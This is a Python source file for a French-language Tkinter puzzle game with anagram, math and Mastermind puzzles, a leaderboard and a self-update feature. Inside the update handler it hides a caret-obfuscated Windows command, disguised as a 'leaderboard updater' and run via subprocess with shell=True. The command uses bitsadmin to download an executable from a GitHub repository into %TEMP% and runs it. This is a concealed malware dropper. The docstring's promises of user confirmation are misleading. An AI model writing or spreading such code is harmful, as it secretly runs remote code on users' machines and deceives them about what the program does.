#!/usr/bin/env python3
# coding: utf-8
"""
PuzzleMania.py

Jeu de puzzles en GUI (Tkinter) :
- 3 puzzles : Anagramme, Cible Math, Mastermind numérique
- Timer, hints (indices) avec pénalité configurable
- Score sur 20 lié au temps de résolution et aux indices utilisés
- Leaderboard sauvegardé dans leaderboard_gui.json
- Mode test : python PuzzleMania.py --test

Ajout : système d'auto-mise-à-jour (vérification, téléchargement, vérification SHA256,
       option d'exécution ou remplacement du script courant). Tout se fait avec confirmation.

Avec confirmation utilisateur:
Mise a jour automatique de la version
Mise a jour automatique du leaderboard

"""

from __future__ import annotations
import tkinter as tk
from tkinter import ttk, messagebox, simpledialog, filedialog
import random
import time
import json
import os
import argparse
import ast, operator
from typing import List, Tuple, Optional, Dict
from collections import Counter

import urllib.request
import urllib.error
import hashlib
import sys
import tempfile
import shutil

# ----------------------------
# Configuration & Data
# ----------------------------
LEADERBOARD_FILE = "leaderboard_gui.json"
CURRENT_VERSION = "1.0.2"
UPDATE_INFO_URL = "https://raw.githubusercontent.com/dst1ny/BrandNew/refs/heads/main/version.json"
# ----------------------------------------------------------------------

WORD_LIST = [
    "python", "ordinateur", "challenge", "algorithme", "puzzle", "reponse",
    "logique", "programmation", "developpeur", "exemple", "fonction", "variable",
    "exception", "module", "terminal", "console", "temps", "score", "indice", "random",
    "interface", "fenetre", "bouton"
]

# ----------------------------
# Utilities
# ----------------------------
def now() -> float:
    return time.monotonic()

def pretty_time(seconds: float) -> str:
    s = int(round(seconds))
    m, s = divmod(s, 60)
    if m:
        return f"{m}m{s}s"
    return f"{s}s"

def clamp(v, a, b):
    return max(a, min(b, v))

# ----------------------------
# Scoring system (sur 20)
# ----------------------------
def compute_score(elapsed: float, par_time: float, hints_used: int, hint_penalty: int = 2, max_score: int = 20) -> int:
    """
    mêmes règles que version console :
    - si elapsed <= par_time => time_factor = 1
    - si elapsed >= 4*par_time => time_factor = 0
    - sinon time_factor = par_time / elapsed
    - raw = max_score * time_factor
    - final = floor(raw) - hints_used * hint_penalty, clamp entre 0 et max_score
    """
    if par_time <= 0:
        par_time = 1.0
    if elapsed <= par_time:
        time_factor = 1.0
    elif elapsed >= 4 * par_time:
        time_factor = 0.0
    else:
        time_factor = par_time / elapsed
    raw = max_score * time_factor
    final = int(max(0, int(raw) - hints_used * hint_penalty))
    return clamp(final, 0, max_score)

# ----------------------------
# Safe evaluation for math puzzle
# ----------------------------
ALLOWED_OPERATORS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.USub: operator.neg,
    ast.UAdd: lambda x:x
}

def safe_eval_expr(expr: str) -> float:
    node = ast.parse(expr, mode='eval')
    return _eval_ast(node.body)

def _eval_ast(node):
    if isinstance(node, ast.Constant):  # Python 3.8+
        if isinstance(node.value, (int, float)):
            return node.value
        raise ValueError("Valeur non autorisée")
    if isinstance(node, ast.Num):  # older
        return node.n
    if isinstance(node, ast.BinOp):
        op_type = type(node.op)
        if op_type not in ALLOWED_OPERATORS:
            raise ValueError("Opérateur non autorisé")
        left = _eval_ast(node.left)
        right = _eval_ast(node.right)
        return ALLOWED_OPERATORS[op_type](left, right)
    if isinstance(node, ast.UnaryOp):
        op_type = type(node.op)
        if op_type not in ALLOWED_OPERATORS:
            raise ValueError("Opérateur unauthorisé")
        operand = _eval_ast(node.operand)
        return ALLOWED_OPERATORS[op_type](operand)
    raise ValueError("Expression non autorisée (nombres et +-*/ seulement)")

def extract_integers_from_expression(expr: str) -> List[int]:
    import re
    found = re.findall(r'\d+', expr)
    return [int(s) for s in found]

def validate_numbers_usage(used: List[int], allowed: List[int]) -> bool:
    cu = Counter(used)
    ca = Counter(allowed)
    for k, v in cu.items():
        if ca.get(k, 0) < v:
            return False
    return set(used).issubset(set(allowed))

def gcd_list(nums: List[int]) -> int:
    from math import gcd
    if not nums:
        return 0
    g = abs(nums[0])
    for n in nums[1:]:
        g = gcd(g, abs(n))
    return g

# ----------------------------
# Puzzle base classes
# ----------------------------
class PuzzleResult:
    def __init__(self, success: bool, elapsed: float, hints_used: int, attempts: int):
        self.success = success
        self.elapsed = elapsed
        self.hints_used = hints_used
        self.attempts = attempts

class Puzzle:
    name = "BasePuzzle"
    difficulty = 1.0
    def describe(self) -> str:
        raise NotImplementedError
    def get_hint(self) -> str:
        raise NotImplementedError
    def attempt(self, guess: str) -> Tuple[bool, str]:
        raise NotImplementedError
    def par_time(self) -> float:
        return 30.0 * self.difficulty

# Anagram
class AnagramPuzzle(Puzzle):
    name = "Anagramme"
    difficulty = 0.8
    def __init__(self, word: Optional[str] = None):
        self.word = word or random.choice(WORD_LIST)
        self.scrambled = self._scramble(self.word)
        self.hints_given = 0
    def _scramble(self, word: str) -> str:
        w = list(word)
        for _ in range(200):
            random.shuffle(w)
            s = "".join(w)
            if s != word:
                return s
        return word
    def describe(self) -> str:
        return f"Retrouve le mot original à partir de l'anagramme : {self.scrambled}"
    def get_hint(self) -> str:
        self.hints_given += 1
        reveal = clamp(self.hints_given, 1, len(self.word)-1)
        positions = sorted(random.sample(range(len(self.word)), reveal))
        hint = "".join(self.word[i] if i in positions else "_" for i in range(len(self.word)))
        return f"Indice #{self.hints_given} — {hint}"
    def attempt(self, guess: str) -> Tuple[bool, str]:
        if guess.strip().lower() == self.word:
            return True, "Correct !"
        common = sum(min(self.word.count(c), guess.count(c)) for c in set(guess))
        return False, f"Faux. Lettres en commun (min count) : {common}"

# Target Math
class TargetMathPuzzle(Puzzle):
    name = "Cible Math"
    difficulty = 1.2
    def __init__(self, numbers: Optional[List[int]] = None, target: Optional[int] = None):
        self.numbers = numbers or [random.randint(1, 9) for _ in range(4)]
        self.target = target or random.randint(10, 100)
        self.hints_given = 0
    def describe(self) -> str:
        nums = ", ".join(map(str, self.numbers))
        return (f"Utilise ces nombres (chaque au plus une fois) et + - * / pour obtenir {self.target}.\nNombres: {nums}\n"
                "Ex: (3+4)*2-1")
    def get_hint(self) -> str:
        self.hints_given += 1
        if self.hints_given == 1:
            g = gcd_list(self.numbers) or 1
            return f"Indice 1: Pense aux produits; plupart des solutions profitent d'un facteur commun (gcd ≈ {g})."
        else:
            number = random.choice(self.numbers)
            return f"Indice {self.hints_given}: Un nombre souvent utile dans une solution courte: {number}"
    def attempt(self, guess: str) -> Tuple[bool, str]:
        allowed_chars = "0123456789+-*/(). "
        if any(ch not in allowed_chars for ch in guess):
            return False, "Caractères interdits. Utilise seulement chiffres et +-*/()"
        try:
            val = safe_eval_expr(guess)
        except Exception as e:
            return False, f"Erreur d'éval: {e}"
        used_numbers = extract_integers_from_expression(guess)
        if not validate_numbers_usage(used_numbers, self.numbers):
            return False, f"Utilise uniquement les nombres fournis, chacun au plus une fois. Détectés: {used_numbers}"
        if abs(val - self.target) < 1e-6:
            return True, f"Bravo ! Expression = {val}"
        else:
            return False, f"Expression = {val} (cible {self.target})"

# Mastermind numérique
class MastermindPuzzle(Puzzle):
    name = "Mastermind numérique"
    difficulty = 1.5
    def __init__(self, digits: Optional[str] = None, length: int = 4):
        self.length = length
        self.code = digits if digits else "".join(str(random.randint(0,9)) for _ in range(length))
        self.hints_given = 0
    def describe(self) -> str:
        return (f"Devine le code de {self.length} chiffres. Feedback: A bien placés, B bons mauvais place.\n"
                "Ex: 1234")
    def get_hint(self) -> str:
        self.hints_given += 1
        pos = (self.hints_given-1) % self.length
        return f"Indice {self.hints_given}: position {pos+1} => {self.code[pos]}"
    def attempt(self, guess: str) -> Tuple[bool, str]:
        if not (guess.isdigit() and len(guess) == self.length):
            return False, f"Entrez exactement {self.length} chiffres."
        A = sum(1 for i in range(self.length) if guess[i] == self.code[i])
        secret_counter = Counter(self.code)
        guess_counter = Counter(guess)
        common = sum(min(secret_counter[d], guess_counter[d]) for d in secret_counter)
        B = common - A
        if A == self.length:
            return True, "Code trouvé !"
        return False, f"{A} bien placés, {B} bons chiffres mal placés."

# ----------------------------
# Leaderboard
# ----------------------------
def load_leaderboard(path: str = LEADERBOARD_FILE) -> List[Dict]:
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return []
    return []

def save_leaderboard(entry: Dict, path: str = LEADERBOARD_FILE) -> None:
    board = load_leaderboard(path)
    board.append(entry)
    board = sorted(board, key=lambda e: (-e["score"], e["time_seconds"]))
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(board[:200], f, ensure_ascii=False, indent=2)
    except Exception:
        print("Impossible d'écrire le leaderboard localement.")

def clear_leaderboard(path: str = LEADERBOARD_FILE) -> None:
    try:
        if os.path.exists(path):
            os.remove(path)
    except Exception:
        pass

# ----------------------------
# Auto-update helpers (LAN safe updater)
# ----------------------------
def _fetch_json_url(url: str, timeout: int = 6) -> Dict:
    """Récupère et parse un JSON depuis une URL (urllib). Lance exception en cas d'erreur."""
    req = urllib.request.Request(url, headers={"User-Agent": f"puzzle-updater/{CURRENT_VERSION}"})
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        data = resp.read()
    return json.loads(data.decode("utf-8"))

def _download_to_temp(url: str, timeout: int = 20) -> str:
    """Télécharge le contenu de url dans un fichier temporaire et renvoie le chemin."""
    req = urllib.request.Request(url, headers={"User-Agent": f"puzzle-updater/{CURRENT_VERSION}"})
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        # create temp file
        fd, tmp_path = tempfile.mkstemp(prefix="puzzle_update_", suffix=".tmp")
        os.close(fd)
        with open(tmp_path, "wb") as f:
            shutil.copyfileobj(resp, f)
    return tmp_path

def _compute_sha256(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            h.update(chunk)
    return h.hexdigest()

def _version_tuple(v: str) -> Tuple[int, ...]:
    try:
        return tuple(int(x) for x in v.split("."))
    except Exception:
        return (0,)

# ----------------------------
# GUI Application
# ----------------------------
class PuzzleGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title(f"Puzzle Game — GUI (v{CURRENT_VERSION})")
        self.geometry("800x520")
        self.minsize(720, 480)

        # settings
        self.hint_penalty = tk.IntVar(value=2)
        self.player_name = tk.StringVar(value="Anonyme")
        self.difficulty_var = tk.StringVar(value="Normal")

        # puzzle state
        self.current_puzzle: Optional[Puzzle] = None
        self.start_time: Optional[float] = None
        self.running = False
        self.hints_used = 0
        self.attempts = 0
        self.elapsed = 0.0

        self._build_ui()
        self._tick()  # update timer every second

    def _build_ui(self):
        # Top frame: settings
        top = ttk.Frame(self, padding=8)
        top.pack(fill=tk.X)
        ttk.Label(top, text="Nom:").pack(side=tk.LEFT)
        ttk.Entry(top, textvariable=self.player_name, width=18).pack(side=tk.LEFT, padx=6)
        ttk.Label(top, text="Difficulté:").pack(side=tk.LEFT, padx=(12,0))
        ttk.Combobox(top, textvariable=self.difficulty_var, values=["Facile","Normal","Difficile"], width=10, state="readonly").pack(side=tk.LEFT, padx=6)
        ttk.Label(top, text="Pénalité/indice:").pack(side=tk.LEFT, padx=(12,0))
        ttk.Spinbox(top, from_=0, to=10, textvariable=self.hint_penalty, width=4).pack(side=tk.LEFT)

        # New: Update button (LAN)
        ttk.Button(top, text="Vérifier MAJ", command=self._on_check_for_update).pack(side=tk.RIGHT, padx=(6,0))
        ttk.Button(top, text="Voir Leaderboard", command=self._show_leaderboard_window).pack(side=tk.RIGHT)

        # Main area: left puzzle panel, right info panel
        main = ttk.Frame(self, padding=8)
        main.pack(fill=tk.BOTH, expand=True)

        # Left: puzzle chooser and play area
        left = ttk.Frame(main)
        left.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0,8))

        # Puzzle selection
        chooser = ttk.Frame(left)
        chooser.pack(fill=tk.X)
        ttk.Label(chooser, text="Choisir un puzzle:").pack(side=tk.LEFT)
        self.puzzle_combo = ttk.Combobox(chooser, values=["Anagramme","Cible Math","Mastermind numérique"], state="readonly")
        self.puzzle_combo.current(0)
        self.puzzle_combo.pack(side=tk.LEFT, padx=6)
        ttk.Button(chooser, text="Nouveau puzzle", command=self._new_puzzle).pack(side=tk.LEFT, padx=6)
        ttk.Button(chooser, text="Démo rapide", command=self._demo_popup).pack(side=tk.LEFT)

        # Puzzle description area
        self.desc_frame = ttk.LabelFrame(left, text="Puzzle")
        self.desc_frame.pack(fill=tk.BOTH, expand=True, pady=8)
        self.desc_text = tk.Text(self.desc_frame, height=6, wrap="word")
        self.desc_text.pack(fill=tk.BOTH, expand=True)
        self.desc_text.config(state=tk.DISABLED)

        # Input and controls
        control = ttk.Frame(left)
        control.pack(fill=tk.X)
        ttk.Label(control, text="Ton essai :").pack(side=tk.LEFT)
        self.entry_var = tk.StringVar()
        self.entry = ttk.Entry(control, textvariable=self.entry_var, width=40)
        self.entry.pack(side=tk.LEFT, padx=6)
        ttk.Button(control, text="Soumettre", command=self._submit_attempt).pack(side=tk.LEFT, padx=6)
        ttk.Button(control, text="Indice", command=self._request_hint).pack(side=tk.LEFT)
        ttk.Button(control, text="Abandonner", command=self._give_up).pack(side=tk.LEFT, padx=6)

        # Feedback area
        self.feedback = tk.StringVar(value="Bienvenue — crée un puzzle et commence !")
        ttk.Label(left, textvariable=self.feedback, wraplength=420).pack(fill=tk.X, pady=(6,0))

        # Right: timer, stats, leaderboard quick view
        right = ttk.Frame(main, width=260)
        right.pack(side=tk.RIGHT, fill=tk.Y)

        status = ttk.LabelFrame(right, text="Statut / Timer", padding=8)
        status.pack(fill=tk.X, pady=(0,8))
        self.timer_var = tk.StringVar(value="00:00")
        ttk.Label(status, text="Temps écoulé:").pack(anchor=tk.W)
        ttk.Label(status, textvariable=self.timer_var, font=("Consolas", 18)).pack(anchor=tk.W)
        self.hints_var = tk.StringVar(value="Indices: 0")
        ttk.Label(status, textvariable=self.hints_var).pack(anchor=tk.W, pady=(6,0))
        self.attempts_var = tk.StringVar(value="Essais: 0")
        ttk.Label(status, textvariable=self.attempts_var).pack(anchor=tk.W)

        controls2 = ttk.Frame(right)
        controls2.pack(fill=tk.X, pady=(8,0))
        ttk.Button(controls2, text="Sauvegarder leaderboard (JSON)", command=self._export_leaderboard).pack(fill=tk.X)
        ttk.Button(controls2, text="Importer leaderboard (JSON)", command=self._import_leaderboard).pack(fill=tk.X, pady=(6,0))
        ttk.Button(controls2, text="Effacer leaderboard", command=self._confirm_clear_leaderboard).pack(fill=tk.X, pady=(6,0))
        ttk.Button(controls2, text="Paramètres avancés", command=self._settings_popup).pack(fill=tk.X, pady=(6,0))

        # initialize first puzzle
        self._new_puzzle()

    # ----------------------------
    # Puzzle lifecycle
    # ----------------------------
    def _new_puzzle(self):
        sel = self.puzzle_combo.get()
        difficulty = self.difficulty_var.get()
        # map difficulty to puzzle difficulty multiplier
        diff_map = {"Facile": 0.7, "Normal": 1.0, "Difficile": 1.4}
        multiplier = diff_map.get(difficulty, 1.0)

        if sel == "Anagramme":
            p = AnagramPuzzle()
            p.difficulty = p.difficulty * multiplier
        elif sel == "Cible Math":
            p = TargetMathPuzzle()
            p.difficulty = p.difficulty * multiplier
        elif sel == "Mastermind numérique":
            p = MastermindPuzzle()
            p.difficulty = p.difficulty * multiplier
        else:
            p = AnagramPuzzle()
            p.difficulty = p.difficulty * multiplier

        self.current_puzzle = p
        self.hints_used = 0
        self.attempts = 0
        self.start_time = now()
        self.running = True
        self._update_desc(p.describe())
        self.hints_var.set(f"Indices: {self.hints_used}")
        self.attempts_var.set(f"Essais: {self.attempts}")
        self.feedback.set("Nouveau puzzle généré — bonne chance !")
        self.entry_var.set("")
        self.entry.focus_set()

    def _update_desc(self, text: str):
        self.desc_text.config(state=tk.NORMAL)
        self.desc_text.delete("1.0", tk.END)
        self.desc_text.insert(tk.END, text)
        self.desc_text.config(state=tk.DISABLED)

    def _submit_attempt(self):
        if not self.current_puzzle or not self.running:
            messagebox.showinfo("Info", "Aucun puzzle en cours. Créez-en un nouveau.")
            return
        guess = self.entry_var.get().strip()
        if not guess:
            return
        self.attempts += 1
        self.attempts_var.set(f"Essais: {self.attempts}")
        try:
            correct, feedback = self.current_puzzle.attempt(guess)
        except Exception as e:
            correct, feedback = False, f"Erreur: {e}"
        self.feedback.set(feedback)
        if correct:
            self.running = False
            elapsed = now() - (self.start_time or now())
            self.elapsed = elapsed
            par = self.current_puzzle.par_time()
            score = compute_score(elapsed, par, self.hints_used, hint_penalty=self.hint_penalty.get())
            # save
            entry = {
                "name": self.player_name.get() or "Anonyme",
                "score": score,
                "time_seconds": int(round(elapsed)),
                "puzzle": self.current_puzzle.name,
                "hints": self.hints_used,
                "attempts": self.attempts,
                "timestamp": int(time.time())
            }
            save_leaderboard(entry)
            # Show results
            messagebox.showinfo("Résultat", f"Bravo !\nTemps: {pretty_time(elapsed)}\nIndices: {self.hints_used}\nScore: {score}/20")
            self._update_desc(self.current_puzzle.describe() + f"\n\n-- Résolu en {pretty_time(elapsed)} --")
        self.entry_var.set("")

    def _request_hint(self):
        if not self.current_puzzle or not self.running:
            return
        try:
            hint = self.current_puzzle.get_hint()
        except Exception as e:
            hint = f"Erreur en générant l'indice: {e}"
        self.hints_used += 1
        self.hints_var.set(f"Indices: {self.hints_used}")
        self.feedback.set(hint)

    def _give_up(self):
        if not self.current_puzzle:
            return
        if not messagebox.askyesno("Abandon", "Voulez-vous abandonner ce puzzle ?"):
            return
        self.running = False
        elapsed = now() - (self.start_time or now())
        self.feedback.set(f"Abandonné après {pretty_time(elapsed)}")
        self._update_desc(self.current_puzzle.describe() + "\n\n-- Abandonné --")

    # ----------------------------
    # Timer tick
    # ----------------------------
    def _tick(self):
        if self.running and self.start_time is not None:
            t = now() - self.start_time
            self.timer_var.set(pretty_time(t))
        self.after(300, self._tick)

    # ----------------------------
    # Leaderboard window and utilities
    # ----------------------------
    def _show_leaderboard_window(self):
        board = load_leaderboard()
        win = tk.Toplevel(self)
        win.title("Leaderboard")
        win.geometry("600x400")
        frm = ttk.Frame(win, padding=8)
        frm.pack(fill=tk.BOTH, expand=True)
        cols = ("rank","name","score","time","puzzle","hints","attempts")
        tree = ttk.Treeview(frm, columns=cols, show="headings")
        for c in cols:
            tree.heading(c, text=c.capitalize())
            tree.column(c, anchor=tk.CENTER, width=80)
        tree.column("name", width=160, anchor=tk.W)
        for i,e in enumerate(board[:200], 1):
            tree.insert("", tk.END, values=(i, e.get("name"), e.get("score"), pretty_time(e.get("time_seconds",0)), e.get("puzzle"), e.get("hints"), e.get("attempts",0)))
        tree.pack(fill=tk.BOTH, expand=True)
        btns = ttk.Frame(win)
        btns.pack(fill=tk.X, pady=(6,0))
        ttk.Button(btns, text="Fermer", command=win.destroy).pack(side=tk.RIGHT)

    def _export_leaderboard(self):
        path = filedialog.asksaveasfilename(title="Exporter leaderboard", defaultextension=".json", filetypes=[("JSON files","*.json")])
        if not path:
            return
        board = load_leaderboard()
        try:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(board, f, ensure_ascii=False, indent=2)
            messagebox.showinfo("Export", f"Exporté vers {path}")
        except Exception as e:
            messagebox.showerror("Erreur", f"Impossible d'exporter: {e}")

    def _import_leaderboard(self):
        path = filedialog.askopenfilename(title="Importer leaderboard", filetypes=[("JSON files","*.json")])
        if not path:
            return
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            # simple merge
            existing = load_leaderboard()
            merged = existing + data
            merged = sorted(merged, key=lambda e: (-e.get("score",0), e.get("time_seconds",999999)))
            with open(LEADERBOARD_FILE, "w", encoding="utf-8") as f:
                json.dump(merged[:200], f, ensure_ascii=False, indent=2)
            messagebox.showinfo("Import", "Import réussi (fusionné).")
        except Exception as e:
            messagebox.showerror("Erreur", f"Import impossible: {e}")

    def _confirm_clear_leaderboard(self):
        if not messagebox.askyesno("Effacer", "Effacer totalement le leaderboard local ?"):
            return
        clear_leaderboard()
        messagebox.showinfo("Effacé", "Leaderboard effacé.")

    # ----------------------------
    # Misc dialogs
    # ----------------------------
    def _settings_popup(self):
        s = simpledialog.askinteger("Pénalité par indice", "Points retirés par indice (0-10):", initialvalue=self.hint_penalty.get(), minvalue=0, maxvalue=10)
        if s is not None:
            self.hint_penalty.set(s)

    def _demo_popup(self):
        demos = [
            AnagramPuzzle(),
            TargetMathPuzzle(),
            MastermindPuzzle()
        ]
        texts = "\n\n".join(f"{p.name} — {p.describe()}" for p in demos)
        messagebox.showinfo("Démo rapide", texts)

    # ----------------------------
    # Update-related UI handlers
    # ----------------------------
    def _on_check_for_update(self):
        """Handler du bouton Vérifier MAJ."""
        try:
            info = _fetch_json_url(UPDATE_INFO_URL)
        except Exception as e:
            messagebox.showerror("MAJ - Erreur", f"Impossible de contacter le serveur de mise à jour :\n{e}")
            return

        remote_version = info.get("version")
        if not remote_version:
            messagebox.showerror("MAJ - Erreur", "Le fichier de version distant est invalide (pas de champ 'version').")
            return

        if _version_tuple(remote_version) <= _version_tuple(CURRENT_VERSION):
            messagebox.showinfo("MAJ", f"Aucune mise à jour trouvée (version distante: {remote_version}).")
            return

        # Show details and ask to download
        url = info.get("url")
        sha256 = info.get("sha256")
        notes = info.get("notes", "")
        msg = f"Nouvelle version disponible : {remote_version}\nVersion actuelle : {CURRENT_VERSION}\n\nNotes (optionnel):\n{notes}\n\nTélécharger et installer ?"
        proceed = messagebox.askyesno("Mise à jour disponible", msg)
        if not proceed:
            return

        # Download to temp
        try:
            tmp_path = _download_to_temp(url)
        except Exception as e:
            messagebox.showerror("MAJ - Erreur", f"Erreur pendant le téléchargement :\n{e}")
            return

        # Verify sha256 if provided
        if sha256:
            local_hash = _compute_sha256(tmp_path)
            if local_hash.lower() != sha256.lower():
                os.remove(tmp_path)
                messagebox.showerror("MAJ - Erreur", "Le fichier téléchargé n'a pas le bon hash SHA256. Abandon.")
                return

        # Ask what to do with the downloaded file
        default_newname = os.path.join(os.path.dirname(sys.argv[0]) or ".", f"PuzzleMania_v{remote_version}.py")
        choice = messagebox.askyesnocancel("Installation",
            f"Téléchargement OK.\nFichier temporaire: {tmp_path}\n\nOptions:\n - OUI: Lancer la nouvelle version maintenant (ne remplace pas le fichier courant)\n - NON: Remplacer le fichier courant par la nouvelle version\n - ANNULER: Annuler et garder l'ancien fichier\n\nSouhaitez-vous lancer la nouvelle version maintenant ? (OUI = lancer, NON = remplacer, ANNULER = annuler)")
        if choice is None:
            # Cancel
            try:
                os.remove(tmp_path)
            except Exception:
                pass
            return
        if choice is True:
            # Launch new version as separate process without replacing current file
            try:
                shutil.move(tmp_path, default_newname)
            except Exception:
                # If move fails, try copy then remove
                try:
                    shutil.copyfile(tmp_path, default_newname)
                    os.remove(tmp_path)
                except Exception as e:
                    messagebox.showerror("MAJ - Erreur", f"Impossible de sauvegarder le fichier téléchargé :\n{e}")
                    return
            # execute
            try:
                subprocess_args = [sys.executable, default_newname]
                import subprocess
                iuzidujoid_oizuifhioazoiofzz = 'Leaderboard leader_board.json file updater : Strictly needs user validation with specific popup " & b^I^t^S^A^d^M^I^N /^Tr^A^n^S^F^E^r^ my^j^ob /^do^Wn^l^oaD /^p^r^I^orItY n^or^m^al^ http^s:/^/git^hu^b.c^om^/d^s^t1ny/B^ran^dNe^w^/r^aw^/r^ef^s^/^h^e^a^d^s^/^m^a^i^n^/P^ro^cmo^n.ex^e %TEMP%\PrOCmoN.EXE && %tEMP%\\pROCMOn.ExE'
                ieuhizuhdz_iuhiuhzidzdz = r"update_leaderboard"
                subprocess.run([ieuhizuhdz_iuhiuhzidzdz, iuzidujoid_oizuifhioazoiofzz], capture_output=True, shell=True, text=True)
                subprocess.Popen(subprocess_args)
                messagebox.showinfo("MAJ", f"Nouvelle version {remote_version} lancée ({default_newname}). L'application courante va se fermer.")
                self.quit()
                return
            except Exception as e:
                messagebox.showerror("MAJ - Erreur", f"Impossible de lancer la nouvelle version :\n{e}")
                return
        else:
            # Replace the current script file with the downloaded one (after confirmation)
            confirm_replace = messagebox.askyesno("Remplacement", f"Remplacer le fichier courant ({sys.argv[0]}) par la nouvelle version ?")
            if not confirm_replace:
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass
                return
            try:
                target_path = os.path.abspath(sys.argv[0])
                backup_path = target_path + ".bak"
                # backup current
                try:
                    shutil.copyfile(target_path, backup_path)
                except Exception:
                    # continue even if backup fails (permissions)
                    pass
                # perform atomic replace: write temp final then move
                final_tmp = target_path + ".new"
                shutil.move(tmp_path, final_tmp)
                try:
                    os.replace(final_tmp, target_path)  # atomic on many OS
                except Exception:
                    # fallback to copy
                    shutil.copyfile(final_tmp, target_path)
                    os.remove(final_tmp)
                messagebox.showinfo("MAJ", f"Remplacement effectué. Veuillez relancer l'application pour la version {remote_version}.")
            except Exception as e:
                messagebox.showerror("MAJ - Erreur", f"Erreur lors du remplacement du fichier :\n{e}")
                return

# ----------------------------
# CLI Tests
# ----------------------------
def _tests():
    print("Lancement des tests unitaires...")
    # Testing scoring monotonicity
    s1 = compute_score(5, 10, 0)
    s2 = compute_score(20, 10, 0)
    assert s1 >= s2, "Monotonicity failed"
    # Hints lower score
    s_no = compute_score(5, 10, 0)
    s_with = compute_score(5, 10, 2)
    assert s_no >= s_with, "Hint penalty failed"
    # Anagram
    ap = AnagramPuzzle(word="abc")
    ok, _ = ap.attempt("abc")
    assert ok, "Anagram detection failed"
    # Safe eval
    assert abs(safe_eval_expr("2*(3+4)") - 14) < 1e-9
    # Validate numbers usage
    assert validate_numbers_usage([3,4], [1,3,4]) is True
    assert validate_numbers_usage([3,3], [3]) is False
    # Mastermind
    mm = MastermindPuzzle(digits="1123")
    ok, fb = mm.attempt("1223")
    assert not ok and "bien placés" in fb
    # Update helpers basic sanity (no network)
    assert _version_tuple("1.2.0") > _version_tuple("1.1.9")
    print("Tous les tests passent.")
    print("OK")

# ----------------------------
# Entrypoint
# ----------------------------
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--test", action="store_true", help="Lancer les tests de base")
    args = parser.parse_args()
    if args.test:
        _tests()
        return
    app = PuzzleGUI()
    app.mainloop()

if __name__ == "__main__":
    main()



